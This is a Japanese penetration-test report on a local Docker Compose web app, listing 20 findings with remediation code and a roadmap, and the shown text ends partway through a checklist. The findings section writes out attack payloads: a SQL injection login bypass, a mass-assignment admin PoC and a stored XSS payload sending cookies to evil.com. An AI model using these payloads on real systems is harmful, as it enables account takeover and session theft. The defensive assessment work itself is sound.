# リスク評価・是正提案レポート

> **作成日時**: 2026-02-23  
> **診断対象**: ローカルDocker Compose環境（3層Webアプリケーション）  
> **診断期間**: 2026-02-23 12:30 〜 14:15 UTC  
> **参照レポート**:
> - `/docker-work-dir/docs/reports/01-情報収集.md`
> - `/docker-work-dir/docs/reports/02-アタックサーフェース定義.md`
> - `/docker-work-dir/docs/reports/03-スキャン.md`
> - `/docker-work-dir/docs/reports/04-列挙.md`
> - `/docker-work-dir/docs/reports/05-検証項目.md`
> - `/docker-work-dir/docs/reports/06-検証.md`
> - `/docker-work-dir/docs/reports/zap-active-scan.md`
> - `/docker-work-dir/docs/進捗/検証項目チェックリスト.md`

---

## 1. エグゼクティブサマリー（経営層向け）

### 診断結果の概要

本診断では、React フロントエンド・ASP.NET Core API・PostgreSQL データベースで構成される Web アプリケーションに対し、情報収集・スキャン・手動検証・OWASP ZAP アクティブスキャンを実施しました。

**総合評価: 🔴 極めて危険（Extremely Vulnerable）**

診断の結果、**Critical レベル 5 件を含む合計 20 件**の実証済み脆弱性が確認されました。これらの脆弱性が悪用された場合、以下の深刻な被害が発生し得ます。

| 想定される被害シナリオ | 可能性 | ビジネスインパクト |
|----------------------|--------|-----------------|
| データベース全データ（ユーザー情報・パスワード）の漏洩 | 🔴 極めて高い | 個人情報保護法違反、顧客信頼失墜、損害賠償 |
| 認証バイパスによる全アカウントへの不正アクセス | 🔴 極めて高い | サービス全体の乗っ取り、データ改ざん |
| 管理者権限への不正昇格 | 🔴 極めて高い | システム全体の掌握 |
| Stored XSS によるユーザーセッション乗っ取り | 🟠 高い | 二次被害（フィッシング、クレデンシャルスタッフィング） |
| GitHub トークン悪用によるリポジトリへの不正アクセス | 🟠 高い | ソースコード漏洩、CI/CD パイプラインへの侵害 |

### 経営層への推奨事項

1. **本アプリケーションの本番環境への展開は即時停止してください。** 現状のまま公開することは、重大なセキュリティインシデントの発生リスクが極めて高い状態です。
2. **Critical 脆弱性 5 件の修正を最優先**で実施してください（目標: 1〜2 週間以内）。
3. 修正完了後、**第三者機関による再診断**を必ず実施してください。
4. 開発プロセスに **セキュアコーディングレビューと自動セキュリティスキャン**を組み込んでください。

---

## 2. 総合リスク評価（全脆弱性一覧）

### 2.1 統計サマリー

| 重大度 | 件数 | 説明 |
|--------|------|------|
| 🔴 **Critical** | **5** | 即時対応必須。悪用により壊滅的な被害が発生 |
| 🟠 **High** | **5** | 早急対応必須。組み合わせ攻撃でシステム全体へ波及 |
| 🟡 **Medium** | **8** | 計画的に対応。悪用により重大な被害が発生しうる |
| 🟢 **Low** | **2** | 優先度低。攻撃の補助的な情報として利用される |
| **合計** | **20** | |

> ※ OWASP ZAP アクティブスキャンでは別途 99 件のアラート（High: 6, Medium: 9, Low: 39, Info: 45）が検出されています。

### 2.2 確認済み脆弱性一覧

| # | 検証ID | 脆弱性名 | CWE | CVSS スコア | 重大度 | 判定 |
|---|--------|---------|-----|------------|--------|------|
| 1 | V-01 | SQLインジェクション（検索機能） | CWE-89 | **9.8** | 🔴 Critical | 実証済み |
| 2 | V-02 | SQLインジェクション（ログイン認証） | CWE-89 | **9.8** | 🔴 Critical | 実証済み |
| 3 | V-07 | パスワード平文保存・APIレスポンス露出 | CWE-256 / CWE-200 | **9.8** | 🔴 Critical | 実証済み |
| 4 | V-08 | データベースポート外部公開 | CWE-668 | **9.8** | 🔴 Critical | 実証済み |
| 5 | V-05 | Mass Assignment（権限昇格） | CWE-915 | **9.1** | 🔴 Critical | 実証済み |
| 6 | V-18 | GitHub トークン露出 | CWE-798 | **7.5** | 🟠 High | ソースコード確認済み |
| 7 | V-22 | パスワード・認証情報ハードコード | CWE-798 | **7.5** | 🟠 High | 設定ファイル確認済み |
| 8 | V-06 | 認証チェック欠如（削除操作） | CWE-306 | **8.2** | 🟠 High | 実証済み |
| 9 | V-09 | Stored XSS（クロスサイトスクリプティング） | CWE-79 | **7.1** | 🟠 High | 実証済み |
| 10 | V-04 | ディレクトリトラバーサル | CWE-22 | **8.6** | 🟠 High | 判定不能（要追加調査） |
| 11 | V-10 | CORS 設定の不備 | CWE-942 | **6.5** | 🟡 Medium | 実証済み |
| 12 | V-19 | 機密情報ハードコード（APIキー） | CWE-798 | **6.5** | 🟡 Medium | ソースコード確認済み |
| 13 | V-20 | コンテナ root 実行 | CWE-250 | **6.5** | 🟡 Medium | Trivy 確認済み |
| 14 | V-21 | SSL/TLS 未使用 | CWE-319 | **5.9** | 🟡 Medium | 設定ファイル確認済み |
| 15 | V-12 | レート制限の欠如 | CWE-307 | **5.3** | 🟡 Medium | 実証済み |
| 16 | V-14 | セキュリティヘッダ欠如（CSP 等） | CWE-693 | **5.3** | 🟡 Medium | 実証済み |
| 17 | V-23 | 開発者例外ページ有効化 | CWE-209 | **4.3** | 🟡 Medium | 設定確認済み |
| 18 | V-15 | 詳細エラーメッセージ露出 | CWE-209 | **4.3** | 🟡 Medium | 実証済み |
| 19 | V-16 | サーバーバージョン情報露出 | CWE-200 | **3.7** | 🟢 Low | 実証済み |
| 20 | V-17 | ZAP アクティブスキャン総合検出 | 複数 | - | 可変 | 99 件検出 |

---

## 3. 重大度別リスク詳細

### 3.1 🔴 Critical（最重大 — 即時対応必須）

---

#### [V-01 / V-02] SQLインジェクション

**影響エンドポイント**: `GET /api/users?search=`, `POST /api/login`  
**CVSS スコア**: 9.8  
**CWE**: CWE-89

**実証された攻撃ペイロード**:
```bash
# 検索機能でのエラーベース SQLi
GET /api/users?search='
# → PostgreSQL エラーとスタックトレースを返却

# ログイン認証バイパス（SQL で条件を常に真にする）
POST /api/login
{"username": "' OR 1=1 --", "password": "anything"}
# → 認証をバイパスして HTTP 200 でログイン成功
```

**実証された影響**:
- ログイン認証の完全バイパス（任意のユーザーとしてログイン可能）
- データベースエラーメッセージ・スタックトレースの露出
- データベース全体へのアクセス（データ漏洩・改ざん・削除）が理論上可能

**根本原因コード** (`UsersController.cs`, `AuthController.cs`):
```csharp
// ❌ 脆弱なコード: 文字列連結によるSQL構築
var sql = $"SELECT * FROM users WHERE username = '{request.Username}' AND password = '{request.Password}'";

var sql2 = "SELECT * FROM users";
if (!string.IsNullOrEmpty(search))
{
    sql2 += $" WHERE username LIKE '%{search}%' OR email LIKE '%{search}%'";
}
```

---

#### [V-07] パスワード平文保存・APIレスポンス露出

**CVSS スコア**: 9.8  
**CWE**: CWE-256 / CWE-200

**実証された影響**:
- 18,000 件以上のユーザーパスワードが平文でデータベースに保存
- 全ての GET /api/users レスポンスにパスワードが平文で含まれる
- データベース侵害時に全パスワードが即時漏洩

```json
// 実際の API レスポンス（パスワードが平文で露出）
{
  "id": 2,
  "username": "tanaka",
  "password": "newpass",   // ← 平文パスワードが丸見え
  "role": "user"
}
```

---

#### [V-08] データベースポート外部公開

**CVSS スコア**: 9.8  
**CWE**: CWE-668

**実証された影響**:
- `localhost:15432` から PostgreSQL に直接接続可能
- 認証情報 `postgres / postgres123` がハードコード（弱いパスワード）
- アプリケーション層を完全に迂回して全データに直接アクセス可能

```bash
# 実際に外部から直接 DB 接続が成功
PGPASSWORD=postgres123 psql -h localhost -p 15432 -U postgres -d vulndb
# → 全テーブルへのフルアクセス権限取得（18,000+ ユーザーレコード）
```

---

#### [V-05] Mass Assignment（権限昇格）

**CVSS スコア**: 9.1  
**CWE**: CWE-915

**実証された影響**:
- 一般ユーザーが API リクエストで自分を admin に昇格可能
- ユーザー作成・更新時に `role` フィールドの保護なし

```bash
# 実際の攻撃 PoC: role: "admin" を指定してユーザー作成
POST /api/users
{"username": "attacker", "email": "attacker@evil.com", "password": "test123", "role": "admin"}
# → {"id": 18234, "role": "admin", ...} と admin 権限で作成される
```

---

### 3.2 🟠 High（高重大度 — 早急対応必須）

---

#### [V-06] 認証チェック欠如（全エンドポイント）

**CVSS スコア**: 8.2  
**CWE**: CWE-306

全 API エンドポイント（ユーザー削除・作成・更新・一覧取得）が認証なしで実行可能。

```bash
# 認証ヘッダなしでユーザー削除が成功
curl -X DELETE http://api:5000/api/users/1
# → {"message": "User deleted"}  HTTP 200 OK
```

---

#### [V-09] Stored XSS（クロスサイトスクリプティング）

**CVSS スコア**: 7.1  
**CWE**: CWE-79

`username`, `email`, `profileImageUrl` フィールドに XSS ペイロードが無害化なしで保存される。

```bash
# XSS ペイロードをユーザー名として保存
POST /api/users
{"username": "<script>document.location='http://evil.com?c='+document.cookie</script>", ...}
# → そのままデータベースに保存され、一覧表示時に実行される
```

---

#### [V-18] GitHub トークン露出

**CVSS スコア**: 7.5  
**CWE**: CWE-798  
**Trivy 検出**: CRITICAL

`.env` ファイルに GitHub Fine-grained Personal Access Token が平文保存。

```
GH_TOKEN=github_pat_XXXXXXXXXXXX_...  # ← 実際のトークンが露出
```

---

#### [V-22] 認証情報ハードコード

**CVSS スコア**: 7.5  
**CWE**: CWE-798

`docker-compose.yml` に PostgreSQL パスワード（`postgres123`）が平文ハードコード。フロントエンド `config.ts` に内部 API キーと管理パネル URL がハードコード。

```typescript
// src/frontend/src/config.ts
export const INTERNAL_API_KEY = 'sk-vuln-app-secret-key-12345';
export const ADMIN_PANEL_URL = 'http://internal-admin.local:8080';
```

---

#### [V-04] ディレクトリトラバーサル（要追加調査）

**CVSS スコア（推定）**: 8.6  
**CWE**: CWE-22  
**判定**: 判定不能（要追加調査）

`GET /api/files/{filePath}` エンドポイントにパス検証なし。`profileImageUrl` フィールドにトラバーサルペイロードの保存は確認済み。実際のファイルアクセスの悪用可能性は追加調査が必要。

---

### 3.3 🟡 Medium（中重大度 — 計画的対応）

| 検証ID | 脆弱性名 | CVSS | 実証内容 |
|--------|---------|------|---------|
| V-10 | CORS 設定の不備（AllowAnyOrigin） | 6.5 | `Access-Control-Allow-Origin: *` を確認。任意の外部サイトから API へのクロスオリジンリクエストが可能 |
| V-19 | 機密情報ハードコード（フロントエンド） | 6.5 | `config.ts` に APIキー・内部URLがハードコード |
| V-20 | コンテナ root 実行 | 6.5 | Trivy により全 3 Dockerfile でデフォルト root 実行を確認 |
| V-21 | SSL/TLS 未使用（HTTP 平文通信） | 5.9 | DB接続文字列に `SSL Mode=Disable`、全通信が HTTP |
| V-12 | レート制限の欠如 | 5.3 | ログイン API に制限なし。20 回/秒以上の試行が可能 |
| V-14 | セキュリティヘッダ全面欠如 | 5.3 | CSP, X-Frame-Options, HSTS, X-Content-Type-Options 等がすべて未設定 |
| V-23 | 開発者例外ページ有効化 | 4.3 | `app.UseDeveloperExceptionPage()` が本番環境相当で有効 |
| V-15 | 詳細エラーメッセージ露出 | 4.3 | スタックトレース・ソースコードパス（`/src/VulnApi/Controllers/UsersController.cs:line 45`）が API レスポンスに含まれる |

---

### 3.4 🟢 Low（低重大度）

| 検証ID | 脆弱性名 | CVSS | 実証内容 |
|--------|---------|------|---------|
| V-16 | サーバーバージョン情報露出 | 3.7 | `Server: nginx/1.29.5`、`Server: Kestrel` がレスポンスヘッダに含まれる |

---

## 4. OWASP Top 10 マッピング（2021）

| OWASP Top 10 カテゴリ | 該当脆弱性 | 重大度 |
|-----------------------|-----------|--------|
| **A01: アクセス制御の不備** | V-05 (Mass Assignment), V-06 (認証欠如), V-08 (DB外部公開) | 🔴🔴🔴 |
| **A02: 暗号化の失敗** | V-07 (パスワード平文保存), V-21 (SSL/TLS未使用) | 🔴🟡 |
| **A03: インジェクション** | V-01 (SQLi 検索), V-02 (SQLi ログイン), V-09 (Stored XSS) | 🔴🔴🟠 |
| **A04: 安全でない設計** | V-06 (認証設計不備), V-12 (レート制限なし) | 🟠🟡 |
| **A05: セキュリティの設定ミス** | V-10 (CORS), V-14 (セキュリティヘッダ), V-15 (エラー露出), V-19 (機密情報ハードコード), V-20 (root実行), V-21 (SSL/TLS), V-22 (パスワードハードコード) | 🟠〜🟡 |
| **A06: 脆弱で古くなったコンポーネント** | .NET 10.0 プレビュー版使用（本番非推奨） | 🟡 |
| **A07: 識別と認証の失敗** | V-02 (SQLi認証バイパス), V-06 (認証欠如), V-12 (ブルートフォース) | 🔴🟠🟡 |
| **A08: ソフトウェアとデータの整合性の失敗** | V-05 (Mass Assignment によるロール改ざん) | 🔴 |
| **A09: セキュリティログおよびモニタリングの失敗** | 監査ログが未実装（全エンドポイント） | 🟡 |
| **A10: サーバーサイドリクエストフォージェリ（SSRF）** | V-19 (内部URL漏洩が SSRF の踏み台になりうる) | 🟡 |

> ⚠️ OWASP Top 10 の全カテゴリにわたって脆弱性が存在しており、セキュリティ設計の根本的な見直しが必要です。

---

## 5. 各脆弱性の是正提案（具体的なコード・設定例）

### 5.1 [V-01 / V-02] SQLインジェクション対策

**是正方針**: パラメータ化クエリ（Prepared Statement）への完全移行

**❌ 現在の脆弱なコード** (`AuthController.cs`):
```csharp
var sql = $"SELECT * FROM users WHERE username = '{request.Username}' AND password = '{request.Password}'";
```

**✅ 修正後コード**:
```csharp
// Npgsql のパラメータ化クエリを使用
using var cmd = new NpgsqlCommand(
    "SELECT id, username, email, role FROM users WHERE username = @username",
    conn);
cmd.Parameters.AddWithValue("@username", request.Username);

// パスワードはハッシュ比較（bcrypt）のためSQLに含めない
using var reader = await cmd.ExecuteReaderAsync();
if (reader.Read())
{
    var storedHash = reader.GetString("password_hash");
    if (!BCrypt.Net.BCrypt.Verify(request.Password, storedHash))
        return Unauthorized();
}
```

**❌ 現在の脆弱なコード** (`UsersController.cs`):
```csharp
sql += $" WHERE username LIKE '%{search}%' OR email LIKE '%{search}%'";
```

**✅ 修正後コード**:
```csharp
if (!string.IsNullOrEmpty(search))
{
    sql += " WHERE username LIKE @search OR email LIKE @search";
    cmd.Parameters.AddWithValue("@search", $"%{search}%");
}
```

> **代替案**: Entity Framework Core ORM の採用により、パラメータ化クエリが自動的に適用されます。

---

### 5.2 [V-07] パスワードのハッシュ化と APIレスポンスからの除去

**是正方針**: bcrypt/Argon2 によるパスワードハッシュ化 + レスポンス DTO の分離

**Step 1: bcrypt ハッシュ化の実装**

```xml
<!-- VulnApi.csproj に追加 -->
<PackageReference Include="BCrypt.Net-Next" Version="4.0.3" />
```

```csharp
// パスワード保存時
var passwordHash = BCrypt.Net.BCrypt.HashPassword(user.Password, workFactor: 12);
// DB には passwordHash を保存

// パスワード検証時
bool isValid = BCrypt.Net.BCrypt.Verify(inputPassword, storedHash);
```

**Step 2: APIレスポンス用 DTO でパスワードを除外**

```csharp
// UserResponseDto.cs を新規作成
public class UserResponseDto
{
    public int Id { get; set; }
    public string Username { get; set; } = string.Empty;
    public string Email { get; set; } = string.Empty;
    public string Role { get; set; } = string.Empty;
    public string ProfileImageUrl { get; set; } = string.Empty;
    public DateTime CreatedAt { get; set; }
    public DateTime UpdatedAt { get; set; }
    // ← password フィールドは意図的に除外
}

// UsersController.cs でマッピング
return Ok(new UserResponseDto
{
    Id = user.Id,
    Username = user.Username,
    // password は含めない
});
```

**Step 3: データベーススキーマ変更**

```sql
-- パスワードカラムをハッシュ用に変更
ALTER TABLE users RENAME COLUMN password TO password_hash;
ALTER TABLE users ALTER COLUMN password_hash TYPE VARCHAR(72);  -- bcrypt ハッシュ長

-- 既存パスワードは無効化し、パスワードリセットを強制
UPDATE users SET password_hash = NULL WHERE password_hash IS NOT NULL;
```

---

### 5.3 [V-08] データベースポート外部公開の解消

**是正方針**: `docker-compose.yml` からデータベースポートのマッピングを削除

**❌ 現在の設定** (`docker-compose.yml`):
```yaml
services:
  db:
    image: postgres:16-alpine
    ports:
      - "15432:5432"  # ← 削除する
    environment:
      POSTGRES_PASSWORD: postgres123  # ← シークレット管理に移行
```

**✅ 修正後設定**:
```yaml
services:
  db:
    image: postgres:16-alpine
    # ports は削除（外部公開しない）
    environment:
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
    secrets:
      - db_password
    networks:
      - internal  # 内部ネットワークのみ

  api:
    depends_on:
      db:
        condition: service_healthy
    networks:
      - internal
      - external

  frontend:
    networks:
      - external

secrets:
  db_password:
    file: ./secrets/db_password.txt  # .gitignore に追加

networks:
  internal:
    internal: true  # 外部からアクセス不可
  external:
```

---

### 5.4 [V-05] Mass Assignment（権限昇格）対策

**是正方針**: 入力 DTO と保存エンティティの分離 + ロール変更の明示的な制御

**❌ 現在の脆弱なコード**:
```csharp
[HttpPost]
public async Task<IActionResult> Create([FromBody] User user)
{
    // user.Role がそのまま DB に保存される
}
```

**✅ 修正後コード**:
```csharp
// CreateUserDto.cs（入力専用 DTO）
public class CreateUserDto
{
    [Required]
    public string Username { get; set; } = string.Empty;
    [Required, EmailAddress]
    public string Email { get; set; } = string.Empty;
    [Required, MinLength(8)]
    public string Password { get; set; } = string.Empty;
    // ← role フィールドは受け付けない
}

// UsersController.cs
[HttpPost]
public async Task<IActionResult> Create([FromBody] CreateUserDto dto)
{
    var user = new User
    {
        Username = dto.Username,
        Email = dto.Email,
        PasswordHash = BCrypt.Net.BCrypt.HashPassword(dto.Password, 12),
        Role = "user",  // ← 常に "user" で固定（admin への変更は管理API経由のみ）
        CreatedAt = DateTime.UtcNow,
        UpdatedAt = DateTime.UtcNow
    };
    // DB に保存
}
```

---

### 5.5 [V-06] 認証・認可の実装

**是正方針**: JWT ベースの認証・認可の実装

```xml
<!-- VulnApi.csproj に追加 -->
<PackageReference Include="Microsoft.AspNetCore.Authentication.JwtBearer" Version="10.0.0" />
```

```csharp
// Program.cs
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuerSigningKey = true,
            IssuerSigningKey = new SymmetricSecurityKey(
                Encoding.UTF8.GetBytes(builder.Configuration["Jwt:Secret"]!)),
            ValidateIssuer = true,
            ValidIssuer = "vuln-api",
            ValidateAudience = true,
            ValidAudience = "vuln-frontend",
            ValidateLifetime = true,
            ClockSkew = TimeSpan.Zero
        };
    });

builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("AdminOnly", policy => policy.RequireRole("admin"));
});

// UsersController.cs
[Authorize]                    // ← 全エンドポイントに認証必須
[HttpDelete("{id}")]
public async Task<IActionResult> Delete(int id)
{
    // 自分のアカウントのみ削除可能（admin は全員削除可能）
    var currentUserId = int.Parse(User.FindFirst(ClaimTypes.NameIdentifier)!.Value);
    if (currentUserId != id && !User.IsInRole("admin"))
        return Forbid();
    // ...
}
```

---

### 5.6 [V-09] XSS（クロスサイトスクリプティング）対策

**是正方針**: 入力値検証（サーバー側）＋ 出力エスケープ（フロントエンド側）

**サーバー側入力検証** (`UsersController.cs`):
```csharp
// 入力値の正規化とバリデーション
public class CreateUserDto
{
    [Required]
    [RegularExpression(@"^[a-zA-Z0-9_\-\.]{3,50}$",
        ErrorMessage = "ユーザー名は英数字・_・-・.のみ使用可能（3〜50文字）")]
    public string Username { get; set; } = string.Empty;

    [Required, EmailAddress]
    [MaxLength(255)]
    public string Email { get; set; } = string.Empty;

    [Url]
    [MaxLength(500)]
    public string? ProfileImageUrl { get; set; }  // ← URL形式バリデーション
}
```

**フロントエンド側出力エスケープ** (`UserList.tsx`):
```tsx
// ❌ 脆弱なコード
<div dangerouslySetInnerHTML={{ __html: user.username }} />

// ✅ 修正後（React はデフォルトでエスケープするため通常の JSX を使用）
<div>{user.username}</div>

// profileImageUrl は URL の安全性を検証してから使用
const isSafeUrl = (url: string): boolean => {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
};

<img src={isSafeUrl(user.profileImageUrl) ? user.profileImageUrl : '/default-avatar.png'}
     alt="Profile" />
```

---

### 5.7 [V-18 / V-22] 機密情報管理の改善

**是正方針**: シークレット管理ツールの導入、環境変数の分離

```bash
# .gitignore に追加
.env
.env.local
secrets/

# ❌ NG: リポジトリに含めてはいけないファイル
# .env, docker-compose.override.yml（パスワード含む）
```

```yaml
# ✅ docker-compose.yml（シークレット参照のみ）
services:
  api:
    environment:
      - ConnectionStrings__DefaultConnection=Host=db;Port=5432;Database=vulndb;Username=postgres;Password=${DB_PASSWORD};SSL Mode=Require
    # ${DB_PASSWORD} は .env や CI/CD シークレットから注入

  db:
    environment:
      - POSTGRES_PASSWORD=${DB_PASSWORD}
```

```typescript
// ❌ 脆弱なコード（config.ts）
export const INTERNAL_API_KEY = 'sk-vuln-app-secret-key-12345';

// ✅ 修正後: ビルド時環境変数を使用（フロントエンドには絶対的な機密情報を含めない）
// フロントエンドには公開されても問題ない情報のみ置く
export const API_BASE_URL = import.meta.env.VITE_API_BASE_URL ?? '/api';
// INTERNAL_API_KEY はサーバー側（API）でのみ管理する
```

**GitHub トークンの即時対応**:
1. [GitHub Settings > Developer settings > Personal access tokens](https://github.com/settings/tokens) で該当トークンを**即時失効**
2. 新しいトークンは GitHub Actions Secrets または環境変数として管理

---

### 5.8 [V-10] CORS 設定の適正化

**❌ 現在の設定** (`Program.cs`):
```csharp
policy.AllowAnyOrigin().AllowAnyMethod().AllowAnyHeader();
```

**✅ 修正後**:
```csharp
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        policy
            .WithOrigins(
                "http://localhost:3000",
                "http://frontend:80",
                builder.Configuration["AllowedOrigins"] ?? ""
            )
            .WithMethods("GET", "POST", "PUT", "DELETE", "OPTIONS")
            .WithHeaders("Content-Type", "Authorization")
            .AllowCredentials();
    });
});
```

---

### 5.9 [V-12] レート制限の実装（ブルートフォース対策）

**ASP.NET Core 組み込みのレート制限**:
```csharp
// Program.cs
builder.Services.AddRateLimiter(options =>
{
    // ログインエンドポイント: IP アドレスごとに 5 回/分に制限
    options.AddFixedWindowLimiter("LoginPolicy", limiterOptions =>
    {
        limiterOptions.PermitLimit = 5;
        limiterOptions.Window = TimeSpan.FromMinutes(1);
        limiterOptions.QueueProcessingOrder = QueueProcessingOrder.OldestFirst;
        limiterOptions.QueueLimit = 0;
    });
});

// AuthController.cs
[EnableRateLimiting("LoginPolicy")]
[HttpPost("/api/login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    // ...
}
```

---

### 5.10 [V-14] セキュリティヘッダの設定

**Nginx 設定** (`nginx.conf`):
```nginx
server {
    # セキュリティヘッダ
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' http://api:5000; frame-ancestors 'none';" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
    add_header Cross-Origin-Opener-Policy "same-origin" always;
    add_header Cross-Origin-Resource-Policy "same-origin" always;

    # バージョン情報を非表示
    server_tokens off;

    # HTTPS 使用時は追加
    # add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    location /api/ {
        proxy_pass http://api:5000/api/;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

**ASP.NET Core API** (`Program.cs`):
```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers.Remove("Server");
    context.Response.Headers.Append("X-Content-Type-Options", "nosniff");
    context.Response.Headers.Append("X-Frame-Options", "DENY");
    await next();
});
```

---

### 5.11 [V-15] エラーハンドリングの改善

```csharp
// Program.cs
if (!app.Environment.IsDevelopment())
{
    // ❌ 開発者例外ページを本番で有効化しない
    // app.UseDeveloperExceptionPage();

    // ✅ 本番用エラーハンドリング
    app.UseExceptionHandler(errorApp =>
    {
        errorApp.Run(async context =>
        {
            context.Response.StatusCode = 500;
            context.Response.ContentType = "application/json";
            // エラー詳細はログに記録し、クライアントには汎用メッセージのみ返す
            await context.Response.WriteAsJsonAsync(new
            {
                error = "Internal Server Error",
                traceId = context.TraceIdentifier  // サポート用トレースIDのみ
            });
        });
    });
}

// appsettings.Production.json
{
  "Logging": {
    "LogLevel": {
      "Default": "Warning",
      "Microsoft.AspNetCore": "Warning"
    }
  }
}
```

---

### 5.12 [V-20] コンテナの非 root 実行

**`src/api/Dockerfile`**:
```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:10.0 AS build
WORKDIR /src
COPY . .
RUN dotnet publish -c Release -o /app

FROM mcr.microsoft.com/dotnet/aspnet:10.0
WORKDIR /app

# ✅ 非 root ユーザーを作成
RUN addgroup --system --gid 1001 appgroup && \
    adduser --system --uid 1001 --ingroup appgroup appuser
USER appuser  # ← root 以外のユーザーで実行

COPY --from=build --chown=appuser:appgroup /app .
EXPOSE 5000
ENTRYPOINT ["dotnet", "VulnApi.dll"]
```

**`src/frontend/Dockerfile`**:
```dockerfile
FROM node:22-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM nginx:1.29.5-alpine
COPY --from=build /app/dist /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf

# ✅ nginx は nobody ユーザーで実行
RUN chown -R nginx:nginx /usr/share/nginx/html
USER nginx
```

---

### 5.13 [V-21] SSL/TLS の有効化

```yaml
# docker-compose.yml
services:
  api:
    environment:
      - ConnectionStrings__DefaultConnection=Host=db;Port=5432;Database=vulndb;Username=postgres;Password=${DB_PASSWORD};SSL Mode=Require;Trust Server Certificate=true
      - ASPNETCORE_URLS=https://+:5001;http://+:5000
      - ASPNETCORE_HTTPS_PORTS=5001
```

> 本番環境では Let's Encrypt や組織の PKI による正規証明書を使用してください。

---

## 6. 是正優先度ロードマップ

### 📅 短期対応（1〜2 週間以内）— Critical / High 対応

> **目標**: 壊滅的な被害を防ぐ最低限のセキュリティを確保する

| 優先度 | タスク | 検証ID | 工数目安 |
|--------|-------|--------|---------|
| 1 | **GitHub トークンの即時失効と再発行** | V-18 | 1時間 |
| 2 | **DB ポートの外部公開停止**（docker-compose.yml 修正） | V-08 | 2時間 |
| 3 | **SQLインジェクション修正**（パラメータ化クエリへの移行） | V-01, V-02 | 2日 |
| 4 | **パスワードのハッシュ化実装**（bcrypt）＋ APIレスポンスから除外 | V-07 | 2日 |
| 5 | **Mass Assignment 対策**（入力 DTO の分離） | V-05 | 1日 |
| 6 | **認証・認可の実装**（JWT ベース） | V-06 | 3日 |
| 7 | **エラーハンドリングの修正**（スタックトレース非公開化） | V-15, V-23 | 半日 |
| 8 | **パスワード・APIキーのハードコード削除**（環境変数化） | V-19, V-22 | 1日 |

---

### 📅 中期対応（1〜2 ヶ月以内）— High / Medium 対応

> **目標**: セキュリティのベースラインを業界標準レベルまで引き上げる

| 優先度 | タスク | 検証ID | 工数目安 |
|--------|-------|--------|---------|
| 1 | **XSS 対策**（入力バリデーション＋出力エスケープ） | V-09 | 2日 |
| 2 | **ディレクトリトラバーサル修正**（パス正規化・ホワイトリスト） | V-04 | 1日 |
| 3 | **CORS 設定の適正化** | V-10 | 半日 |
| 4 | **レート制限の実装**（ログイン API） | V-12 | 1日 |
| 5 | **セキュリティヘッダの設定**（CSP, X-Frame-Options 等） | V-14 | 1日 |
| 6 | **コンテナの非 root 実行** | V-20 | 1日 |
| 7 | **SSL/TLS 有効化**（HTTPS 化） | V-21 | 2日 |
| 8 | **サーバーバージョン情報の非公開化** | V-16 | 半日 |
| 9 | **第三者機関による再診断の実施** | - | 2週間 |

---

### 📅 長期対応（3〜6 ヶ月以内）— 恒久的なセキュリティ改善

> **目標**: セキュリティを開発プロセスに組み込み、継続的な品質維持を実現する

| 優先度 | タスク | 概要 |
|--------|-------|------|
| 1 | **セキュアコーディング研修** | 開発チーム全員を対象に OWASP Top 10 ベースの研修を実施 |
| 2 | **セキュリティ要件定義の整備** | 機能要件と並行してセキュリティ要件を仕様書に明記 |
| 3 | **SAST（静的解析）ツール導入** | SonarQube、GitHub CodeQL を CI/CD に組み込む |
| 4 | **DAST（動的解析）の自動化** | OWASP ZAP を CI/CD パイプラインに統合 |
| 5 | **シークレット管理基盤の整備** | HashiCorp Vault または AWS Secrets Manager を導入 |
| 6 | **セキュリティ監査ログの実装** | 認証イベント・特権操作の監査ログを実装・保管 |
| 7 | **脆弱性管理プロセスの確立** | 定期的なペネトレーションテストと脆弱性トラッキングの実施 |
| 8 | **インシデントレスポンス計画の策定** | セキュリティインシデント発生時の対応フロー・体制を文書化 |

---

## 7. 再発防止策

### 7.1 開発プロセスへのセキュリティ組み込み（DevSecOps）

```
開発フロー:
  設計 → コーディング → コードレビュー → テスト → リリース
  ↓         ↓               ↓              ↓         ↓
脅威モデリング  セキュアコーディング  セキュリティ     DAST     ペネトレ
             ガイドライン参照    レビュー追加    スキャン    ーション
                               (SAST)               テスト
```

**具体的な実装**:

```yaml
# .github/workflows/security.yml
name: Security Scan

on: [push, pull_request]

jobs:
  codeql:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with:
          languages: csharp, javascript
      - uses: github/codeql-action/analyze@v3

  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Trivy secret scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          scanners: 'secret'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'  # シークレット検出時はビルドを失敗させる

  dependency-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Check .NET dependencies
        run: dotnet list package --vulnerable --include-transitive
```

### 7.2 セキュアコーディングチェックリスト（開発者向け）

コードレビュー時に必ず確認すべき項目:

```markdown
## プルリクエストセキュリティチェックリスト

### 入力値処理
- [ ] SQLクエリはすべてパラメータ化クエリまたは ORM を使用しているか
- [ ] ユーザー入力が HTML/JavaScript として出力される場合、エスケープされているか
- [ ] ファイルパスにユーザー入力を使用する場合、パス正規化・ホワイトリスト検証をしているか

